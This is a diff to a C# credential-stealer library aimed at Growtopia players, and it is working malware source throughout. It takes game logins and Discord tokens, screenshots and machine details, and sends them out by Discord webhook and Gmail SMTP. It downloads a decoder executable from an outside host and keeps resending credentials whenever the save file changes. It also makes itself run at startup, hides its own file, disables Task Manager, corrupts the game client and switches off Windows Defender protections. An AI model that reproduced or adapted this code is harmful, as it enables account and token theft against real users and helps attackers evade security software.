@@ -9,17 +9,35 @@ using System.Linq;
 using System.Management;
 using System.Net;
 using System.Net.Http;
+using System.Net.Mail;
 using System.Net.NetworkInformation;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
+/* 
+       │ Author       : extatent
+       │ Name         : StealerLibrary
+       │ GitHub       : https://github.com/extatent
+*/
+
 namespace StealerLibrary
 {
-    public class Growtopia
+    public class Library
     {
-        #region Stealer
-        public static void Stealer(string WebhookUrl, string ProfilePictureUrl, string WebhookName, bool LastWorldBool, bool MACAddressBool, bool IPAddressBool, bool Token, bool Username, bool PCName, bool OSInformationBool, bool CountryBool, bool Screenshot)
+        #region Configuration
+        public static string DiscordWebhookUrl { get; set; }
+        public static string WebhookName { get; set; }
+        public static string WebhookProfilePictureUrl { get; set; }
+        public static string Gmail { get; set; }
+        public static string GmailPassword { get; set; }
+        public static string SMTPServer { get; set; }
+        public static int SMTPPort { get; set; }
+        #endregion
+
+        #region Discord Stealer
+        public static void DiscordStealer(bool LastWorldBool, bool MACAddressBool, bool IPAddressBool, bool Token, bool Username, bool PCName, bool OSInformationBool, bool CountryBool, bool Screenshot)
         {
             try
             {
@@ -36,11 +54,12 @@ namespace StealerLibrary
                 string screen = Path.GetTempPath() + "screen.jpg";
                 string MACAddress = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback).Select(nic => nic.GetPhysicalAddress().ToString()).FirstOrDefault();
 
-                Webhook hook = new Webhook(WebhookUrl);
+                Webhook hook = new Webhook(DiscordWebhookUrl);
                 hook.Name = WebhookName;
-                hook.ProfilePictureUrl = ProfilePictureUrl;
+                hook.ProfilePictureUrl = WebhookProfilePictureUrl;
                 string details;
                 details = "GrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
+
                 if (LastWorldBool)
                 {
                     details += "Last World: " + LastWorld + Environment.NewLine;
@@ -90,6 +109,432 @@ namespace StealerLibrary
         }
         #endregion
 
+        #region Gmail Stealer
+        public static void GmailStealer(bool LastWorldBool, bool MACAddressBool, bool IPAddressBool, bool Token, bool Username, bool PCName, bool OSInformationBool, bool CountryBool, bool Screenshot)
+        {
+            try
+            {
+                DeleteTempFiles();
+                GetGrowIDPass();
+                string LastWorld = GetLastWorld(SaveDatPath());
+                string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
+                string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
+                string IPAddress = GetIPAddress();
+                string GetToken = DiscordToken();
+                string OSInfo = OSInformation();
+                string Culture = CultureInfo.CurrentCulture.EnglishName;
+                string GetCountry = Culture.Substring(Culture.IndexOf('(') + 1, Culture.LastIndexOf(')') - Culture.IndexOf('(') - 1);
+                string screen = Path.GetTempPath() + "screen.jpg";
+                string MACAddress = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback).Select(nic => nic.GetPhysicalAddress().ToString()).FirstOrDefault();
+
+                MailMessage mail = new MailMessage();
+                SmtpClient smtp = new SmtpClient(SMTPServer, SMTPPort);
+                smtp.Credentials = new NetworkCredential(Gmail, GmailPassword);
+                smtp.EnableSsl = true;
+                mail.From = new MailAddress(Gmail);
+                mail.To.Add(Gmail);
+                mail.IsBodyHtml = false;
+                mail.Subject = "StealerLibrary";
+                mail.Body = "GrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
+                if (LastWorldBool)
+                {
+                    mail.Body += "Last World: " + LastWorld + Environment.NewLine;
+                }
+                if (MACAddressBool)
+                {
+                    mail.Body += "MAC Address: " + MACAddress + Environment.NewLine;
+                }
+                if (IPAddressBool)
+                {
+                    mail.Body += "IP Address: " + IPAddress + Environment.NewLine;
+                }
+                if (Token)
+                {
+                    mail.Body += "Discord Token: " + GetToken + Environment.NewLine;
+                }
+                if (Username)
+                {
+                    mail.Body += "User Name: " + Environment.UserName + Environment.NewLine;
+                }
+                if (PCName)
+                {
+                    mail.Body += "Machine Name: " + Environment.MachineName + Environment.NewLine;
+                }
+                if (OSInformationBool)
+                {
+                    mail.Body += "OS Information: " + OSInfo + Environment.NewLine;
+                }
+                if (CountryBool)
+                {
+                    mail.Body += "Country: " + GetCountry + " / " + Culture + Environment.NewLine;
+                }
+                if (Screenshot)
+                {
+                    TakeScreenshot();
+                    mail.Body += "Desktop Screenshot:";
+                    Attachment attachment;
+                    attachment = new Attachment(screen);
+                    mail.Attachments.Add(attachment);
+                    smtp.Send(mail);
+                    DeleteTempFiles();
+                    return;
+                }
+                smtp.Send(mail);
+                DeleteTempFiles();
+            }
+            catch
+            {
+            }
+        }
+        #endregion
+
+        #region Functions
+        public static void Functions(bool RunOnStartup, bool DisableTaskManager, bool CorruptGrowtopia, bool HideStealer, bool DisableWinDefender)
+        {
+            try
+            {
+                if (RunOnStartup)
+                {
+                    try
+                    {
+                        RegistryKey Run = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        Run.SetValue("Updater", Application.ExecutablePath);
+                    }
+                    catch
+                    { }
+                }
+                if (DisableTaskManager)
+                {
+                    try
+                    {
+                        RegistryKey Reg = null;
+                        if (Environment.Is64BitOperatingSystem)
+                        {
+                            Reg = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
+                        }
+                        else
+                        {
+                            Reg = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
+                        }
+                        RegistryKey TaskMgr = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
+
+                        if (TaskMgr.GetValueNames().Contains("DisableTaskMgr"))
+                        {
+                            TaskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+                        }
+                        TaskMgr.Close();
+                    }
+                    catch
+                    { }
+                }
+                if (CorruptGrowtopia)
+                {
+                    try
+                    {
+                        RegistryKey Reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Growtopia");
+                        bool boolean = Reg != null;
+                        string Path;
+                        if (boolean)
+                        {
+                            Path = Reg.GetValue("path").ToString();
+                            byte[] Array = File.ReadAllBytes(Path + "\\Growtopia.exe");
+                            string Bytes = Encoding.Default.GetString(Array);
+                            Bytes = Bytes.Replace("growtopia1.com", RandomString(14)).Replace("growtopia2.com", RandomString(14));
+                            File.WriteAllBytes(Path + "\\Growtopia.exe", Encoding.Default.GetBytes(Bytes));
+                        }
+                    }
+                    catch
+                    { }
+                }
+                if (HideStealer)
+                {
+                    try
+                    {
+                        File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System);
+                    }
+                    catch
+                    { }
+                }
+                if (DisableWinDefender)
+                {
+                    try
+                    {
+                        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
+                        RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
+                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
+                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
+                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
+                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
+                        CheckDefender();
+                    }
+                    catch
+                    { }
+                }
+            }
+            catch
+            {
+            }
+        }
+        #endregion
+
+        #region Trace Save.dat
+        public static void TraceSaveDat(bool Discord, bool Gmail)
+        {
+            if (Discord)
+            {
+                TraceDiscord();
+            }
+            if (Gmail)
+            {
+                TraceGmail();
+            }
+        }
+        #endregion
+
+        #region Trace Save.dat (Discord Webhook)
+        static string GTDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia", lib;
+        static string GTSaveDat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
+        static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
+        static void SendDC()
+        {
+            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
+            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
+            if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
+            {
+                lib = GrowID + Password;
+                Webhook hook = new Webhook(DiscordWebhookUrl);
+                hook.Name = WebhookName;
+                hook.ProfilePictureUrl = WebhookProfilePictureUrl;
+                string details;
+                details = "Account GrowID or Password was changed.\nGrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
+                hook.SendMessage(details);
+            }
+        }
+
+        static void TraceDiscord()
+        {
+            GetGrowIDPass();
+            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
+            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
+
+            fileSystemWatcher.Path = GTDirectory;
+            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
+            fileSystemWatcher.Filter = "*.dat";
+            fileSystemWatcher.Changed += DCTracer;
+            fileSystemWatcher.EnableRaisingEvents = true;
+            while (true)
+            {
+                Thread.Sleep(1000);
+            }
+        }
+
+        private static void DCTracer(object source, FileSystemEventArgs e)
+        {
+            if (e.FullPath == GTSaveDat)
+            {
+                try
+                {
+                    GetGrowIDPass();
+                    string LastWorld = GetLastWorld(SaveDatPath());
+                    string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
+                    string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
+                    fileSystemWatcher.EnableRaisingEvents = false;
+                    if (lib != GrowID + Password)
+                    {
+                        lib = GrowID + Password;
+                        if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
+                        {
+                            SendDC();
+                        }
+                    }
+                }
+                finally
+                {
+                    fileSystemWatcher.EnableRaisingEvents = true;
+                }
+            }
+        }
+        #endregion
+
+        #region Trace Save.dat (Gmail)
+        static FileSystemWatcher fileSystemWatcher2 = new FileSystemWatcher();
+        static void SendGmail()
+        {
+            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
+            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
+            if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
+            {
+                lib = GrowID + Password;
+                MailMessage mail = new MailMessage();
+                SmtpClient smtp = new SmtpClient(SMTPServer, SMTPPort);
+                smtp.Credentials = new NetworkCredential(Gmail, GmailPassword);
+                smtp.EnableSsl = true;
+                mail.From = new MailAddress(Gmail);
+                mail.To.Add(Gmail);
+                mail.IsBodyHtml = false;
+                mail.Subject = "StealerLibrary";
+                mail.Body = "Account GrowID or Password was changed.\nGrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
+                smtp.Send(mail);
+            }
+        }
+
+        static void TraceGmail()
+        {
+            GetGrowIDPass();
+            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
+            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
+
+            fileSystemWatcher2.Path = GTDirectory;
+            fileSystemWatcher2.NotifyFilter = NotifyFilters.LastWrite;
+            fileSystemWatcher2.Filter = "*.dat";
+            fileSystemWatcher2.Changed += GmailTracer;
+            fileSystemWatcher2.EnableRaisingEvents = true;
+            while (true)
+            {
+                Thread.Sleep(1000);
+            }
+        }
+
+        private static void GmailTracer(object source, FileSystemEventArgs e)
+        {
+            if (e.FullPath == GTSaveDat)
+            {
+                try
+                {
+                    GetGrowIDPass();
+                    string LastWorld = GetLastWorld(SaveDatPath());
+                    string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
+                    string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
+                    fileSystemWatcher2.EnableRaisingEvents = false;
+                    if (lib != GrowID + Password)
+                    {
+                        lib = GrowID + Password;
+                        if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
+                        {
+                            SendGmail();
+                        }
+                    }
+                }
+                finally
+                {
+                    fileSystemWatcher2.EnableRaisingEvents = true;
+                }
+            }
+        }
+        #endregion
+
+        #region Disable Windows Defender
+        //https://github.com/NYAN-x-CAT/Disable-Windows-Defender
+        private static void RegistryEdit(string regPath, string name, string value)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                {
+                    if (key == null)
+                    {
+                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
+                        return;
+                    }
+                    if (key.GetValue(name) != (object)value)
+                        key.SetValue(name, value, RegistryValueKind.DWord);
+                }
+            }
+            catch { }
+        }
+
+        private static void CheckDefender()
+        {
+            Process proc = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "powershell",
+                    Arguments = "Get-MpPreference -verbose",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                }
+            };
+            proc.Start();
+            while (!proc.StandardOutput.EndOfStream)
+            {
+                string line = proc.StandardOutput.ReadLine();
+
+                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
+
+                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
+
+                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
+
+                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
+
+                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
+
+                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
+
+                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
+
+                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 
+
+                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
+                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
+
+                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
+                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 
+
+                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
+                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 
+
+                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
+                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow
+
+                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
+                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat
+
+                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
+                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat
+
+                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
+                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
+            }
+        }
+
+        private static void RunPS(string args)
+        {
+            Process proc = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "powershell",
+                    Arguments = args,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                }
+            };
+            proc.Start();
+        }
+        #endregion
+
+        #region Random String
+        private static Random random = new Random();
+        static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+        #endregion
+
         #region Delete Temp Files
         static void DeleteTempFiles()
         {
@@ -101,7 +546,7 @@ namespace StealerLibrary
         #endregion
 
         #region Take Screenshot
-        public static void TakeScreenshot()
+        static void TakeScreenshot()
         {
             Rectangle bounds = Screen.GetBounds(Point.Empty);
             using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
@@ -116,7 +561,7 @@ namespace StealerLibrary
         #endregion
 
         #region Get IP Address
-        public static string GetIPAddress()
+        static string GetIPAddress()
         {
             try
             {
@@ -130,11 +575,11 @@ namespace StealerLibrary
         #endregion
 
         #region Get GrowID and Password
-        public static void GetGrowIDPass()
+        static void GetGrowIDPass()
         {
             try
             {
-                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat"))
+                if (File.Exists(SaveDatPath()))
                 {
                     WebClient wc = new WebClient();
                     wc.DownloadFile("http://anarchy.5v.pl/savedec.exe", Path.GetTempPath() + "\\savedec.exe");
@@ -152,7 +597,7 @@ namespace StealerLibrary
         #endregion
 
         #region Save.dat Path
-        public static string SaveDatPath()
+        static string SaveDatPath()
         {
             string SaveDatPath;
             try
@@ -197,7 +642,7 @@ namespace StealerLibrary
         #endregion
 
         #region Get Last World
-        public static string GetLastWorld(string path)
+        static string GetLastWorld(string path)
         {
             try
             {
@@ -261,7 +706,7 @@ namespace StealerLibrary
         #endregion
 
         #region Get Discord Token
-        public static string DiscordToken()
+        static string DiscordToken()
         {
             string result;
             try
@@ -356,7 +801,7 @@ namespace StealerLibrary
             }
             return result;
         }
-        public static string dotlog(ref string stringx)
+        static string dotlog(ref string stringx)
         {
             bool result;
             try
